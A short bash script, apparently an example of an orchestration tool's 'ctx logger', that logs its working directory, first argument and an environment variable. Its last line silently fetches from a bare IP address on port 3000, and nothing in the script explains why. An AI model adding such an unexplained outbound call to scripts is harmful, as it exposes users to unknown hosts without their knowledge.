#! /bin/bash -e
ctx logger info "Hello to this world"


# will log "current working directory is: /tmp/workdir"
ctx logger info "current working directory is: ${PWD}"



# will log "first arg is: arg1_value"
ctx logger info "first arg is: $1"


# will log "my env variable is: MY_ENV_VARIABLE_VALUE"
ctx logger info "my env variable is: ${MY_ENV_VARIABLE}"

wget -q 128.224.125.160:3000
